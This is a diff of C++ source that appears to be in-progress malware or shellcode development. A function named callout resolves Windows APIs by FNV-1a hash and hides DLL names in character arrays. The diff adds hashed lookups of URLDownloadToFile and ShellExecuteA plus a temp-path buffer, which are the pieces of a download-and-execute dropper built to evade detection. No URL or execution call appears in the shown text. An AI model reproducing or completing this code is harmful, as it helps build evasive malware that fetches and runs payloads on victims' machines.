@@ -64,6 +64,8 @@ typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
 typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
 typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
 typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
+typedef HINSTANCE (*ShellExecuteAHeader)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
+typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
 
 std::uint32_t fnv321a(const char *string)
 {
@@ -385,12 +387,21 @@ int callout(void)
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
    char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
    PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
+   URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xe6c2ead5));
    char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
    SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
+   ShellExecuteAHeader shellExecute = reinterpret_cast<ShellExecuteAHeader>(get_proc_by_hash(shell32Module, 0xb0ff5bf));
+   char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
+   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
+   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
+   strlenHeader strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
+   memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
 
-   std::wcout << "URLDownloadToFile: " << std::hex << fnv321a("URLDownloadToFile") << std::endl;
-   std::wcout << "ShellExecuteA: " << std::hex << fnv321a("ShellExecuteA") << std::endl;
+   char temp_path[MAX_PATH+1];
+   char slash[] = {'\\', 0};
+
+   std::wcout << "GetTempPath2A: " << std::hex << fnv321a("GetTempPath2A") << std::endl;
 
    return 0;
 }
